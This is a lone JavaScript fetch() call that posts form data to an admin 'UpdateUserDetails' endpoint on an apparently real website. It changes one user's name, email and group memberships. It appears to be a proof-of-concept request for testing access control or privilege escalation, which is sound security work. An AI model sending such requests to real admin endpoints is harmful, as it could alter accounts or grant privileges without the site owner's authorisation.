fetch("https://refeng.erad.com/Admin/AdminUsers/UpdateUserDetails", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `PersonKey=25798&LastName=staffian&FirstName=staff&GenderCode=M&EmailAddress=tastethetastytest%2Bstaff%40gmail.com&user_groups=110&user_groups=119&user_groups=120&multiselect=multiselect-all&multiselect=110&multiselect=119&multiselect=120`
      });